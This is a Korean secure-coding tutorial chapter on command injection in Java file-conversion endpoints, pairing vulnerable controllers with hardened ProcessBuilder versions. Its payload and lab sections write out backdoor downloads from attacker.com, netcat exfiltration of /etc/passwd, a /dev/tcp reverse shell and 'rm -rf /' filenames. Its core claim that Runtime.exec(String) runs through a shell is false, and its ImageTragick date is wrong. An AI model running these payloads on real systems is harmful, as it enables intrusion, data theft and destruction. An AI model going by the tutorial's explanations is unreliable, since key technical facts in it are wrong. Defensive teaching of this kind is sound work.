# 명령어 인젝션(Command Injection): 시스템 명령 무단 실행

---

## 🎯 핵심 질문

`Runtime.exec()`이 위험한 이유는 무엇인가? 셸 메타문자(`;`, `|`, `&&`, `$()`)를 어떻게 활용하여 임의 명령을 실행하는가? 파일 변환, 이미지 처리 같은 외부 프로세스 호출이 필요한 경우 어떻게 안전하게 구현하는가?

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

**Command Injection은 가장 심각한 취약점**: SQL Injection은 데이터베이스 내 데이터만 영향을 받지만, Command Injection은 **서버의 전체 운영체제 명령 실행**이 가능.

2012년 ImageMagick "ImageTragick" 취약점: ImageMagick의 이미지 처리 중 Command Injection 발생. 공격자는 악의적인 이미지 파일 업로드로 서버 셸 명령 실행 가능. 전 세계 수백만 서버 영향.

2019년 Synology NAS 취약점: 파일 변환 기능에서 사용자 입력을 직접 `ffmpeg` 명령어로 전달. Command Injection으로 원격 코드 실행(RCE), NAS 전체 접근 가능.

한국 웹 개발 회사 2022년: 파일 압축 라이브러리에서 사용자가 제공한 파일명을 `tar` 명령어에 직접 전달. 공격자가 `; rm -rf /`를 포함한 파일명으로 업로드하여 서버 전체 파일 삭제.

**실무 위험성**:
- 민감한 파일 읽기 (`cat /etc/passwd`, `/home/*/private_keys`)
- 시스템 정보 유출 (`whoami`, `id`, `uname -a`)
- 백도어 설치 (`curl attacker.com/backdoor.sh | bash`)
- 랜섬웨어 실행 (`encrypt_all_files.sh`)
- 다른 시스템으로 수평 이동 (`ssh`, `scp`)
- 데이터베이스 서버 직접 공격

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

```java
// [위험] Runtime.exec() 또는 ProcessBuilder로 사용자 입력을 직접 전달
@RestController
@RequestMapping("/api/files")
public class FileProcessingController {
    
    // 1. 이미지 변환: ImageMagick 취약 패턴
    @PostMapping("/convert")
    public ResponseEntity<?> convertImage(
            @RequestParam("format") String format,
            @RequestParam("file") MultipartFile file) throws IOException {
        
        String filename = file.getOriginalFilename();
        String outputPath = "/tmp/converted_" + UUID.randomUUID() + "." + format;
        
        // [위험] format과 filename을 명령어에 직접 삽입
        String command = "convert " + filename + " -quality 85 " + outputPath;
        
        try {
            // Runtime.exec(String) - 셸을 거치므로 메타문자 해석됨
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            byte[] imageData = Files.readAllBytes(Paths.get(outputPath));
            return ResponseEntity.ok(imageData);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Conversion failed");
        }
    }
    
    // 2. 파일 압축: tar 명령어 취약 패턴
    @PostMapping("/compress")
    public ResponseEntity<?> compressFiles(@RequestParam("files") MultipartFile[] files) throws IOException {
        
        List<String> filenames = new ArrayList<>();
        String uploadDir = "/tmp/uploads/";
        
        // 파일 저장
        for (MultipartFile file : files) {
            String filename = file.getOriginalFilename();
            file.transferTo(new File(uploadDir + filename));
            filenames.add(filename);
        }
        
        // [위험] 사용자가 제공한 파일명을 tar 명령어에 직접 사용
        String fileList = String.join(" ", filenames);
        String command = "tar -czf /tmp/archive.tar.gz -C " + uploadDir + " " + fileList;
        
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            byte[] archiveData = Files.readAllBytes(Paths.get("/tmp/archive.tar.gz"));
            return ResponseEntity.ok(archiveData);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Compression failed");
        }
    }
    
    // 3. 동영상 변환: ffmpeg 취약 패턴
    @PostMapping("/video-convert")
    public ResponseEntity<?> convertVideo(@RequestParam("file") MultipartFile file,
                                         @RequestParam("bitrate") String bitrate) throws IOException {
        
        String inputPath = "/tmp/input_" + UUID.randomUUID() + ".mp4";
        String outputPath = "/tmp/output_" + UUID.randomUUID() + ".webm";
        
        file.transferTo(new File(inputPath));
        
        // [위험] bitrate가 유효한 숫자인지 검증하지 않음
        String command = "ffmpeg -i " + inputPath + " -b:v " + bitrate + " " + outputPath;
        
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            byte[] videoData = Files.readAllBytes(Paths.get(outputPath));
            return ResponseEntity.ok(videoData);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Conversion failed");
        }
    }
    
    // 4. 문서 변환: LibreOffice 취약 패턴
    @PostMapping("/pdf-convert")
    public ResponseEntity<?> convertToPdf(@RequestParam("file") MultipartFile file) throws IOException {
        
        String filename = file.getOriginalFilename();
        String inputPath = "/tmp/" + filename;
        String outputPath = "/tmp/" + filename.substring(0, filename.lastIndexOf('.')) + ".pdf";
        
        file.transferTo(new File(inputPath));
        
        // [위험] filename이 명령어 메타문자 포함 가능
        String command = "libreoffice --headless --convert-to pdf --outdir /tmp " + inputPath;
        
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            byte[] pdfData = Files.readAllBytes(Paths.get(outputPath));
            return ResponseEntity.ok(pdfData);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Conversion failed");
        }
    }
}
```

### 공격 페이로드 사례:

```bash
# 1. 이미지 변환에서의 명령어 주입 (format 파라미터)
format: jpg; cat /etc/passwd #
# 최종 명령어: convert filename -quality 85 /tmp/converted.jpg; cat /etc/passwd #
# ImageMagick 변환 후 /etc/passwd 파일 내용 출력

# 2. 파일 압축에서의 명령어 주입 (파일명 조작)
# 업로드할 파일명: "test.txt; rm -rf /"
# 최종 명령어: tar -czf /tmp/archive.tar.gz -C /tmp/uploads/ test.txt; rm -rf /
# tar 압축 후 전체 파일 시스템 삭제!

# 3. 동영상 변환에서의 명령어 주입 (bitrate 파라미터)
bitrate: 1000k && curl http://attacker.com/backdoor.sh | bash
# 최종 명령어: ffmpeg -i /tmp/input.mp4 -b:v 1000k && curl ... | bash
# ffmpeg 실행 후 공격자 서버에서 백도어 다운로드 및 실행

# 4. PDF 변환에서의 명령어 주입
# 업로드할 파일명: "document.docx$(whoami > /tmp/user.txt).docx"
# 명령어 대체: $(whoami > /tmp/user.txt)가 실행됨
# 또는 파일명: "document`id`docx" (백틱으로 명령어 실행)

# 5. 셸 메타문자 조합
filename: "test.txt; cat /etc/passwd | nc attacker.com 4444"
# 파일명이 실행 명령어의 일부가 되어 /etc/passwd를 공격자에게 전송
```

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

```java
// [방어] ProcessBuilder로 인자 분리 + 입력 검증
@RestController
@RequestMapping("/api/secure/files")
public class SecureFileProcessingController {
    
    private static final Logger log = LoggerFactory.getLogger(SecureFileProcessingController.class);
    
    // 허용된 확장자 화이트리스트
    private static final Set<String> ALLOWED_IMAGE_FORMATS = 
        Set.of("jpg", "jpeg", "png", "gif", "webp");
    private static final Set<String> ALLOWED_VIDEO_CODECS = 
        Set.of("h264", "h265", "vp9", "av1");
    
    // 1. ImageMagick 안전한 사용 (ProcessBuilder + 인자 분리)
    @PostMapping("/convert")
    public ResponseEntity<?> convertImage(
            @RequestParam("format") String format,
            @RequestParam("file") MultipartFile file) throws IOException {
        
        // 입력 검증: 포맷이 허용 목록에 있는지 확인
        if (!ALLOWED_IMAGE_FORMATS.contains(format.toLowerCase())) {
            return ResponseEntity.badRequest().body("Invalid format");
        }
        
        // 파일명 검증: 경로 이동이나 메타문자가 없는지 확인
        String originalFilename = file.getOriginalFilename();
        if (originalFilename == null || !originalFilename.matches("^[a-zA-Z0-9._-]+$")) {
            return ResponseEntity.badRequest().body("Invalid filename");
        }
        
        // 파일 저장
        String inputPath = "/tmp/image_" + UUID.randomUUID().toString();
        file.transferTo(new File(inputPath));
        
        String outputPath = "/tmp/converted_" + UUID.randomUUID() + "." + format;
        
        try {
            // ProcessBuilder 사용: 명령어와 인자를 분리
            List<String> command = new ArrayList<>();
            command.add("convert");
            command.add(inputPath);        // 인자 1: 입력 파일
            command.add("-quality");
            command.add("85");             // 인자 2: 품질 (사용자 입력 아님)
            command.add(outputPath);       // 인자 3: 출력 파일
            
            // ProcessBuilder는 각 요소를 분리된 인자로 취급
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.directory(new File("/tmp"));
            
            // 환경 변수 초기화 (악의적 변수 주입 방지)
            Map<String, String> env = pb.environment();
            env.clear();
            env.put("PATH", "/usr/bin:/bin");
            env.put("HOME", "/tmp");
            
            // 타임아웃 설정
            Process process = pb.start();
            boolean completed = process.waitFor(30, TimeUnit.SECONDS);
            
            if (!completed) {
                process.destroyForcibly();
                return ResponseEntity.status(408).body("Conversion timeout");
            }
            
            if (process.exitValue() != 0) {
                log.warn("ImageMagick conversion failed with exit code: {}", process.exitValue());
                return ResponseEntity.status(500).body("Conversion failed");
            }
            
            // 출력 파일 검증
            Path outputFile = Paths.get(outputPath);
            if (!Files.exists(outputFile) || Files.size(outputFile) > 50 * 1024 * 1024) {
                return ResponseEntity.status(500).body("Invalid output");
            }
            
            byte[] imageData = Files.readAllBytes(outputFile);
            
            // 임시 파일 삭제
            Files.deleteIfExists(Paths.get(inputPath));
            Files.deleteIfExists(outputFile);
            
            return ResponseEntity.ok()
                .header("Content-Type", "image/" + format)
                .body(imageData);
                
        } catch (Exception e) {
            log.error("Image conversion error", e);
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 2. 파일 압축: 안전한 Java 라이브러리 사용
    @PostMapping("/compress")
    public ResponseEntity<?> compressFiles(@RequestParam("files") MultipartFile[] files) throws IOException {
        
        // 파일 검증
        if (files.length > 100) {
            return ResponseEntity.badRequest().body("Too many files");
        }
        
        Path uploadDir = Files.createTempDirectory("uploads_");
        List<Path> uploadedFiles = new ArrayList<>();
        
        try {
            // 파일 저장 및 검증
            for (MultipartFile file : files) {
                String filename = file.getOriginalFilename();
                
                // 파일명 검증: 경로 이동 방지
                if (filename == null || filename.contains("..") || filename.contains("/")) {
                    return ResponseEntity.badRequest().body("Invalid filename");
                }
                
                // 파일 확장자 검증
                if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
                    return ResponseEntity.badRequest().body("Invalid filename");
                }
                
                if (file.getSize() > 100 * 1024 * 1024) {  // 100MB 제한
                    return ResponseEntity.badRequest().body("File too large");
                }
                
                Path filePath = uploadDir.resolve(filename);
                file.transferTo(filePath);
                uploadedFiles.add(filePath);
            }
            
            // Java 라이브러리로 압축 (Apache Commons Compress, zip4j 등)
            Path archivePath = Files.createTempFile("archive_", ".tar.gz");
            
            try (OutputStream fos = Files.newOutputStream(archivePath);
                 GzipCompressorOutputStream gos = new GzipCompressorOutputStream(fos);
                 TarArchiveOutputStream tos = new TarArchiveOutputStream(gos)) {
                
                for (Path uploadedFile : uploadedFiles) {
                    TarArchiveEntry entry = new TarArchiveEntry(uploadedFile.toFile(), 
                                                                  uploadedFile.getFileName().toString());
                    tos.putArchiveEntry(entry);
                    Files.copy(uploadedFile, tos);
                    tos.closeArchiveEntry();
                }
            }
            
            byte[] archiveData = Files.readAllBytes(archivePath);
            
            // 정리
            Files.deleteIfExists(archivePath);
            uploadedFiles.forEach(path -> {
                try {
                    Files.deleteIfExists(path);
                } catch (IOException e) {
                    log.error("Failed to delete temp file", e);
                }
            });
            Files.deleteIfExists(uploadDir);
            
            return ResponseEntity.ok()
                .header("Content-Type", "application/gzip")
                .body(archiveData);
                
        } catch (Exception e) {
            log.error("Compression error", e);
            return ResponseEntity.status(500).body("Compression failed");
        }
    }
    
    // 3. 동영상 변환: 안전한 검증과 ProcessBuilder 분리
    @PostMapping("/video-convert")
    public ResponseEntity<?> convertVideo(
            @RequestParam("file") MultipartFile file,
            @RequestParam("bitrate") String bitrate) throws IOException {
        
        // bitrate 검증: 숫자k/m 형식만 허용
        if (!bitrate.matches("^[0-9]+(k|m)$")) {
            return ResponseEntity.badRequest().body("Invalid bitrate format");
        }
        
        // bitrate 범위 검증
        int bitrateValue = Integer.parseInt(bitrate.replaceAll("[^0-9]", ""));
        if (bitrateValue < 100 || bitrateValue > 50000) {
            return ResponseEntity.badRequest().body("Bitrate out of range");
        }
        
        String inputPath = "/tmp/input_" + UUID.randomUUID() + ".mp4";
        String outputPath = "/tmp/output_" + UUID.randomUUID() + ".webm";
        
        file.transferTo(new File(inputPath));
        
        try {
            // ProcessBuilder로 인자 분리
            List<String> command = new ArrayList<>();
            command.add("ffmpeg");
            command.add("-i");
            command.add(inputPath);        // 입력 파일
            command.add("-b:v");
            command.add(bitrate);          // 비트레이트 (검증된 값)
            command.add("-c:a");
            command.add("aac");            // 오디오 코덱 고정
            command.add(outputPath);       // 출력 파일
            
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Process process = pb.start();
            boolean completed = process.waitFor(60, TimeUnit.SECONDS);
            
            if (!completed) {
                process.destroyForcibly();
                return ResponseEntity.status(408).body("Conversion timeout");
            }
            
            if (process.exitValue() != 0) {
                log.warn("ffmpeg conversion failed");
                return ResponseEntity.status(500).body("Conversion failed");
            }
            
            byte[] videoData = Files.readAllBytes(Paths.get(outputPath));
            
            Files.deleteIfExists(Paths.get(inputPath));
            Files.deleteIfExists(Paths.get(outputPath));
            
            return ResponseEntity.ok()
                .header("Content-Type", "video/webm")
                .body(videoData);
                
        } catch (Exception e) {
            log.error("Video conversion error", e);
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 4. 외부 프로세스 실행의 안전한 래퍼
    private ProcessResult executeCommand(List<String> command, long timeoutSeconds) {
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            
            // 환경 변수 제한
            Map<String, String> env = pb.environment();
            env.clear();
            env.put("PATH", "/usr/bin:/bin");
            
            Process process = pb.start();
            
            // 표준 출력 읽기
            String output = new String(process.getInputStream().readAllBytes());
            String error = new String(process.getErrorStream().readAllBytes());
            
            boolean completed = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
            
            if (!completed) {
                process.destroyForcibly();
                return ProcessResult.timeout();
            }
            
            return new ProcessResult(process.exitValue(), output, error);
            
        } catch (Exception e) {
            log.error("Command execution error", e);
            return ProcessResult.error(e.getMessage());
        }
    }
    
    @Data
    private static class ProcessResult {
        private final int exitCode;
        private final String output;
        private final String error;
        
        public static ProcessResult timeout() {
            return new ProcessResult(-1, "", "Timeout");
        }
        
        public static ProcessResult error(String message) {
            return new ProcessResult(-2, "", message);
        }
    }
}
```

### 의존성 추가 (pom.xml):

```xml
<!-- Apache Commons Compress (파일 압축) -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-compress</artifactId>
    <version>1.21</version>
</dependency>

<!-- OpenCV (이미지/영상 처리 - ImageMagick 대체) -->
<dependency>
    <groupId>org.openpnp</groupId>
    <artifactId>opencv</artifactId>
    <version>4.5.2-2</version>
</dependency>

<!-- FFmpeg Java 래퍼 -->
<dependency>
    <groupId>ws.schild</groupId>
    <artifactId>jave-all-deps</artifactId>
    <version>3.2.0</version>
</dependency>
```

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 1. Runtime.exec(String) vs ProcessBuilder의 차이

```java
// 취약한 방식: Runtime.exec(String)
String command = "convert input.jpg -quality 85 output.jpg; cat /etc/passwd";
Runtime.getRuntime().exec(command);

// 동작 원리:
// 1. Windows 환경: cmd.exe /c "전체 문자열"
// 2. Unix 환경: /bin/sh -c "전체 문자열"
// 3. 셸이 문자열을 해석하므로:
//    - ; 로 명령 분리
//    - | 로 파이프 연결
//    - && 로 조건부 실행
// 4. 결과: 두 명령 모두 실행됨!

// 안전한 방식: ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("convert", "input.jpg", "-quality", "85", "output.jpg");
Process process = pb.start();

// 동작 원리:
// 1. 각 요소가 분리된 인자로 전달
// 2. 셸을 거치지 않음
// 3. ";" 문자는 파일명으로만 취급
// 4. 결과: convert 명령만 실행됨
```

### 2. 셸 메타문자의 악용

```
셸 메타문자와 악용 방법:

1. 명령 분리: ;
   command; another_command
   → 첫 명령 완료 후 두 번째 명령 실행
   
   예: tar -czf archive.tar.gz file.txt; rm -rf /
   
2. 파이프: |
   command1 | command2
   → 첫 명령의 출력을 두 번째 명령의 입력으로
   
   예: cat /etc/passwd | nc attacker.com 4444
   → /etc/passwd 내용을 공격자에게 전송
   
3. 조건부 AND: &&
   command1 && command2
   → 첫 명령 성공(exit 0)시에만 두 번째 명령 실행
   
   예: convert input.jpg output.jpg && curl attacker.com/backdoor.sh | bash
   
4. 조건부 OR: ||
   command1 || command2
   → 첫 명령 실패(exit != 0)시 두 번째 명령 실행
   
   예: /nonexistent || curl attacker.com/backdoor.sh | bash
   
5. 명령어 대체 (백틱): ` ... `
   command `subcommand`
   → subcommand 실행 후 결과를 명령어로 사용
   
   예: convert input.jpg `whoami`.jpg
   → whoami 실행 후 그 결과를 파일명에 포함
   
6. 명령어 대체 ($()): $( ... )
   command $(subcommand)
   → 같은 의미 (백틱보다 권장)
   
   예: tar -czf archive.tar.gz $(find / -name secret.txt)
   → secret.txt를 찾아 압축
   
7. 배경 실행: &
   command &
   → 비동기 실행 (응답 대기 안 함)
   
   예: curl attacker.com/backdoor.sh | bash &
   → 백도어 설치 후 즉시 반환 (로그 숨김)
```

### 3. 파일명 조작을 통한 공격

```java
// 취약한 코드
String filename = request.getParameter("filename");
String command = "tar -czf /tmp/archive.tar.gz -C /tmp/uploads " + filename;
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});

// 공격 페이로드
filename = "file1.txt; curl http://attacker.com/?data=$(cat /etc/passwd)"

// 최종 실행 명령어
tar -czf /tmp/archive.tar.gz -C /tmp/uploads file1.txt; curl http://attacker.com/?data=$(cat /etc/passwd)

// 실행 순서
1. tar 명령 실행
2. ; 로 명령 분리
3. curl 명령 실행
4. $() 로 /etc/passwd 내용을 변수로 치환
5. 결과: /etc/passwd 내용이 attacker.com으로 전송됨
```

### 4. 환경 변수 주입 공격

```java
// 취약한 코드 (ProcessBuilder 사용하지만 환경 변수 정리 안 함)
ProcessBuilder pb = new ProcessBuilder("convert", inputPath, outputPath);
Process process = pb.start();

// 공격 시나리오
// 공격자가 환경 변수 조작:
// LD_PRELOAD=/tmp/malicious.so convert ...
// → LD_PRELOAD는 라이브러리 미리 로드 (privilege escalation)

// 방어 방법
Map<String, String> env = pb.environment();
env.clear();  // 모든 환경 변수 제거
env.put("PATH", "/usr/bin:/bin");  // 필수 변수만 설정
env.put("HOME", "/tmp");
```

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실습 1: 기본 Command Injection 재현

```bash
# 1. 취약한 서버 실행
docker run -d --name vulnerable-app \
  -p 8080:8080 \
  vulnerable-java-app:latest

# 2. 이미지 변환 엔드포인트에서 Command Injection
curl -X POST "http://localhost:8080/api/files/convert" \
  -F "file=@test.jpg" \
  -F "format=jpg; cat /etc/passwd #"

# 응답에 /etc/passwd 파일 내용이 포함됨

# 3. 시스템 정보 유출
curl -X POST "http://localhost:8080/api/files/convert" \
  -F "file=@test.jpg" \
  -F "format=jpg; id;"

# 응답: uid=0(root) gid=0(root) groups=0(root)
# (서버가 root로 실행되는 심각한 상황)
```

### 실습 2: 파일 삭제 공격

```bash
# 취약한 파일 압축 엔드포인트
# 파일명에 셸 메타문자 포함

python3 << 'EOF'
import requests
import io

# 악의적인 파일명: "test.txt; touch /tmp/pwned"
files = {
    'files': (
        'test.txt; touch /tmp/pwned',  # 파일명
        io.BytesIO(b'test content'),
        'text/plain'
    )
}

response = requests.post(
    'http://localhost:8080/api/files/compress',
    files=files
)

print(response.status_code)

# 서버에서:
# tar -czf /tmp/archive.tar.gz -C /tmp/uploads test.txt; touch /tmp/pwned
# 결과: /tmp/pwned 파일 생성됨
EOF
```

### 실습 3: Reverse Shell 공격

```bash
# 공격자 설정 (attacker.com)
nc -l -p 4444

# 취약한 비디오 변환 엔드포인트
curl -X POST "http://localhost:8080/api/files/video-convert" \
  -F "file=@video.mp4" \
  -F "bitrate=1000k && bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# 서버에서 실행되는 명령어:
# ffmpeg -i /tmp/input.mp4 -b:v 1000k && bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 결과: attacker.com의 nc에서 서버 셸 획득
bash-4.4$ whoami
root
bash-4.4$ cat /etc/passwd
...
```

### 실습 4: 방어 코드 검증

```bash
# 1. 안전한 버전 배포
git checkout secure-branch
mvn clean spring-boot:run

# 2. 같은 공격 시도 (모두 차단됨)
curl -X POST "http://localhost:8080/api/secure/files/convert" \
  -F "file=@test.jpg" \
  -F "format=jpg; cat /etc/passwd"

# 응답: 400 Bad Request - Invalid format
# (; 문자 때문에 화이트리스트 검증 실패)

# 3. 정상 변환
curl -X POST "http://localhost:8080/api/secure/files/convert" \
  -F "file=@test.jpg" \
  -F "format=png"

# 응답: 변환된 이미지 바이너리

# 4. ProcessBuilder 안전성 확인 (파일명에 메타문자)
python3 << 'EOF'
import requests
import io

files = {
    'files': (
        'test.txt; rm -rf /',  # 메타문자 포함
        io.BytesIO(b'test'),
        'text/plain'
    )
}

response = requests.post(
    'http://localhost:8080/api/secure/files/compress',
    files=files
)

# 응답: 400 Bad Request - Invalid filename
# (정규식으로 파일명 검증: ^[a-zA-Z0-9._-]+$)
EOF
```

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 항목 | 공격 성공 조건 | 방어 성공 조건 |
|------|----------------|----------------|
| **명령어 실행** | Runtime.exec(String) 또는 shell -c | ProcessBuilder 분리 |
| **메타문자** | 셸이 해석함 | 셸을 거치지 않음 |
| **파일명** | 사용자 입력 그대로 사용 | 정규식 검증 + Path.resolve() |
| **파라미터** | 입력값 검증 없음 | 화이트리스트 기반 검증 |
| **환경 변수** | 상속됨 | 초기화 (env.clear()) |
| **타임아웃** | 없음 | waitFor(timeout) |
| **출력** | 사용자에게 노출 | 검증 + 크기 제한 |
| **경로 이동** | 상대 경로 가능 | Path.resolve() 사용 |

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 외부 도구 호출 vs Java 라이브러리

**외부 도구 (위험)**:
```java
// ImageMagick, ffmpeg, LibreOffice 등
// 성능: 매우 빠름 (native code)
// 보안: 낮음 (Command Injection 위험)
// 의존성: 별도 설치 필요
String command = "convert input.jpg output.png";
```

**Java 라이브러리 (안전)**:
```java
// ImageIO, OpenCV, Jave2 등
// 성능: 느림 (JVM 오버헤드)
// 보안: 높음 (Java 샌드박스)
// 의존성: Maven으로 관리
BufferedImage img = ImageIO.read(inputFile);
```

**최적화**: 성능이 중요한 경우 외부 도구 사용 허용, 하지만 ProcessBuilder + 철저한 입력 검증 필수

### 2. 기능 유연성 vs 보안

**유연한 파라미터 전달 (위험)**:
```java
// 사용자가 ffmpeg 옵션을 직접 지정 가능
String userOptions = request.getParameter("ffmpeg_options");
String command = "ffmpeg -i input.mp4 " + userOptions + " output.webm";
```

**제한된 파라미터 (안전)**:
```java
// 미리 정의된 프리셋만 허용
Map<String, String> presets = Map.of(
    "hd", "-c:v libx264 -preset medium -crf 23",
    "mobile", "-c:v libx264 -preset fast -crf 28"
);
String options = presets.get(userPreset);
```

**권장**: 대부분의 경우 제한된 프리셋으로 충분

### 3. 에러 메시지 노출 vs 보안

**상세한 에러 (위험)**:
```java
catch (Exception e) {
    return ResponseEntity.status(500).body(e.getMessage());
    // "Command not found: /usr/bin/convert" 
    // → 시스템 정보 유출
}
```

**일반화된 에러 (안전)**:
```java
catch (Exception e) {
    log.error("Processing error", e);
    return ResponseEntity.status(500).body("Processing failed");
}
```

## 📌 핵심 정리

1. **Command Injection은 OS 명령 무단 실행**: SQL Injection보다 더 심각 (서버 전체 장악 가능)

2. **Runtime.exec(String)은 위험**: 셸이 메타문자를 해석하므로 명령 조합 공격 가능

3. **ProcessBuilder 사용**: 각 인자를 분리하여 셸을 거치지 않음

4. **입력 검증 필수**:
   - 파일명: 정규식 검증 + `..` 체크
   - 파라미터: 화이트리스트 기반
   - 파일 경로: `Path.resolve()` 사용

5. **환경 변수 초기화**: `env.clear()` 후 필수 변수만 설정

6. **외부 도구 호출**: 보안보다 성능이 중요한 경우에만, ProcessBuilder + 철저한 검증

## 🤔 생각해볼 문제 (+ 해설)

### Q1: ProcessBuilder를 사용해도 파일명이 인자로 포함되면 위험하지 않은가?

```java
ProcessBuilder pb = new ProcessBuilder("tar", "-czf", "archive.tar.gz", userFilename);
```

**A**: 안전하다. ProcessBuilder는 각 요소를 분리된 인자로 전달하므로:

```
userFilename = "file; rm -rf /"

ProcessBuilder 처리:
- 인자 1: "tar"
- 인자 2: "-czf"
- 인자 3: "archive.tar.gz"
- 인자 4: "file; rm -rf /" (이 전체가 파일명)

tar는 이름이 "file; rm -rf /"인 파일을 찾음 (존재하지 않음)
셸이 개입하지 않으므로 rm -rf / 명령은 실행되지 않음
```

따라서 **ProcessBuilder로 분리하면 메타문자 자체가 파일명이 되어 안전**.

---

### Q2: 외부 도구를 호출할 수 없는 제한 환경에서는 어떻게 하는가?

**A**: Java 순수 라이브러리로 대체:

```
ImageMagick → ImageIO, OpenCV, BufferedImage
ffmpeg → JAVE, xuggler, JavaCV
tar/zip → Apache Commons Compress
pdf 변환 → iText, Apache PDFBox
```

**트레이드오프**:
- 성능: 외부 도구가 더 빠름 (10배 이상)
- 보안: Java 라이브러리가 더 안전
- 결정: 보안이 더 중요하므로 Java 라이브러리 권장

---

### Q3: Java 라이브러리도 내부적으로 네이티브 코드를 호출하면 위험하지 않은가?

**A**: 맞다. 하지만 다음과 같은 이점이 있다:

```
1. Java 라이브러리는 입력 검증을 한 후 네이티브 코드 호출
2. 사용자 입력이 직접 OS 명령어가 되지 않음
3. 라이브러리 개발자가 보안을 고려함

예: ImageIO.read(file)
- 입력: File 객체
- 검증: 파일 형식 확인
- 처리: ImageIO가 내부적으로 이미지 디코딩
- 결과: BufferedImage 객체

vs Runtime.exec("convert " + userInput)
- 입력: 사용자 문자열 (검증 없음)
- 처리: 셸이 메타문자 해석
- 결과: 예측 불가능한 명령어 실행
```

**결론**: Java 라이브러리 사용 권장 (보안 + 성능 모두 고려)

---

<div align="center">

**[⬅️ 이전: JPA/JPQL에서의 SQL Injection](./03-jpa-jpql-injection.md)** | **[홈으로 🏠](../README.md)** | **[다음: LDAP/XML/NoSQL 인젝션 ➡️](./05-ldap-xml-nosql-injection.md)**

</div>
